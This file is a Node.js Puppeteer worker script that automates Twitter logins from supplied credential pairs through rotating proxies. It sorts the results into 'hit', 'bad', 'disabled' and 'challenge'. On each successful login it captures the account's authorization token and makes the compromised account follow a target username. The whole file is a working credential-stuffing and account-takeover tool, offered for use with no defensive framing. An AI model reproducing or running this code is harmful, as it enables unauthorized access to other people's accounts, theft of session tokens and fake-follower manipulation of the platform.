const { isMainThread, parentPort, workerData } = require('worker_threads');
const useProxy = require('puppeteer-page-proxy');
const puppeteer = require('puppeteer');
const { execSync } = require('child_process')
class RickDick {
    constructor(options) {
        this.options = options

        this.elements = {
            login: "input[name='session[username_or_email]']",
            login2: "input[name='username']",
            password: "input[name='session[password]']",
            password2: "input[name='password']",
            submit: "div[data-testid='LoginForm_Login_Button']",
            next: "div[class='css-18t94o4 css-1dbjc4n r-42olwf r-sdzlij r-1phboty r-rs99b7 r-peo1c r-1ps3wis r-1ny4l3l r-1guathk r-o7ynqc r-6416eg r-lrvibr']",
            submit2: "div[class='css-901oao r-1awozwy r-18jsvk2 r-6koalj r-18u37iz r-16y2uox r-37j5jr r-a023e6 r-b88u0q r-1777fci r-rjixqe r-bcqeeo r-q4m81j r-qvutc0']",
            follow: "div[class='css-18t94o4 css-1dbjc4n r-42olwf r-sdzlij r-1phboty r-rs99b7 r-2yi16 r-1qi8awa r-1ny4l3l r-ymttw5 r-o7ynqc r-6416eg r-lrvibr']"
        }
    }

    async emit(event, data) {
        parentPort.postMessage(data);
    }

    async init() {
        this.browser = await puppeteer.launch({
            defaultViewport: {
                width: 1920,
                height: 1080
            },
            ignoreHTTPSErrors: true,
            args: ['--disable-web-security',
                '--autoplay-policy=user-gesture-required',
                '--disable-background-networking',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-breakpad',
                '--disable-client-side-phishing-detection',
                '--disable-component-update',
                '--disable-default-apps',
                '--disable-dev-shm-usage',
                '--disable-domain-reliability',
                '--disable-extensions',
                '--disable-features=AudioServiceOutOfProcess',
                '--disable-hang-monitor',
                '--disable-ipc-flooding-protection',
                '--disable-notifications',
                '--disable-offer-store-unmasked-wallet-cards',
                '--disable-popup-blocking',
                '--disable-print-preview',
                '--disable-prompt-on-repost',
                '--disable-renderer-backgrounding',
                '--disable-setuid-sandbox',
                '--disable-speech-api',
                '--disable-sync',
                '--hide-scrollbars',
                '--ignore-gpu-blacklist',
                '--metrics-recording-only',
                '--mute-audio',
                '--no-default-browser-check',
                '--no-first-run',
                '--no-pings',
                '--no-sandbox',
                '--no-zygote',
                '--password-store=basic',
                '--use-gl=swiftshader',
                '--use-mock-keychain',]
        });
        this.context = await this.browser.createIncognitoBrowserContext();
    }

    async end() {
        await this.context.close();
        await this.browser.close();
        process.exit(0);
    }
    async check({ login, password }, proxy, username) {
        return new Promise(async (resolve, reject) => {
            const page = await this.context.newPage();
            this.page = page;

            if (proxy) await page.setRequestInterception(true);
            page.on('request', async (req) => {
                try {
                    if (['googlesyndication.com', 'adservice.google.com',].some(domain => req.url().includes(domain))) return req.abort();
                    if (['media', 'image', 'imageset', 'stylesheet', 'font'].includes(req.resourceType())) return req.abort();

                    if (proxy) await useProxy(req, { proxy })

                    if (page.url().startsWith('https://twitter.com/login/error')) {
                        page.off("request")
                        this.emit('bad', {
                            type: "bad",
                            login, password,
                            proxy
                        });
                        resolve()
                    } else if (page.url().startsWith('https://twitter.com/login?email_disabled=true') || page.url().startsWith('https://twitter.com/login?username_disabled=true')) {
                        page.off("request")
                        this.emit('disabled', {
                            type: "disabled",
                            login, password,
                            proxy
                        });
                        resolve()
                    } else if (page.url().startsWith('https://twitter.com/account/login_challenge')) {
                        page.off("request")
                        this.emit('challenge', {
                            type: "challenge",
                            login, password,
                            proxy
                        });
                        resolve()
                    } else if (page.url() === "https://twitter.com/home" && req.headers()['authorization']) {
                        page.off("request")
                        await this.follow(page, username);
                        this.emit('hit', {
                            type: "hit",
                            login, password,
                            token: req.headers()['authorization'],
                            proxy
                        });
                        resolve()
                    }
                }
                catch (error) {

                }
            });

            page.on('response', async (res) => {
                try {
                    const rawBody = await res.text();
                    if (rawBody.includes("LoginAcid") || rawBody.includes("LoginEnterAlternateIdentifierSubtask")) {
                        page.off("response")
                        this.emit('disabled', {
                            type: "disabled",
                            login, password,
                            proxy
                        });
                        resolve()
                    }


                } catch (error) { }

            });

            await this.load(page, proxy)

            while (page.url() === "https://twitter.com/i/flow/login") {
                return await this.login2(page, {
                    login, password
                })
            }

            while (page.url() === "https://twitter.com/login") {
                await this.login(page, {
                    login, password
                })
            }
        });
    }

    async follow(page = new puppeteer.Page(), username) {
        await page.goto(`https://twitter.com/${username}`)
        await page.waitForSelector(this.elements.follow)
        await page.evaluate((selector) => {
            return document.querySelector(selector).click();
        }, this.elements.follow)
        await page.waitForTimeout(100);
    }

    async load(page = new puppeteer.Page(), proxy = null) {
        return Promise.all([
            page.goto('https://twitter.com/i/flow/login', { waitUntil: 'domcontentloaded' }),
        ])
    }

    async login(page = new puppeteer.Page(), creditential = { login: String(), password: String() }) {
        return await new Promise(async (resolve, reject) => {
            await page.waitForSelector(this.elements.password, { timeout: this.options.navigationTimeout }).catch(reject)
            await page.type(this.elements.login, creditential.login).catch(reject)
            await page.type(this.elements.password, creditential.password).catch(reject)
            await page.click(this.elements.submit).catch(reject)
            resolve();
        })
    }

    async login2(page = new puppeteer.Page(), creditential = { login: String(), password: String() }) {
        return await new Promise(async (resolve, reject) => {
            await page.waitForSelector(this.elements.login2, { timeout: this.options.navigationTimeout }).catch(reject)
            await page.type(this.elements.login2, creditential.login).catch(reject)
            await page.click(this.elements.next).catch(reject)
            await page.waitForSelector(this.elements.password2).catch(() => { })
            await page.type(this.elements.password2, creditential.password).catch(() => { })
            await page.click(this.elements.submit2).catch(() => { })
            resolve();
        })
    }
}



(async () => {
    const rick = new RickDick(workerData.options);
    await rick.init();
    await rick.check(workerData.creditential, workerData.proxy, workerData.username).finally(() => {
        rick.page.close();
        rick.context.close();
        rick.browser.close();
    })
})();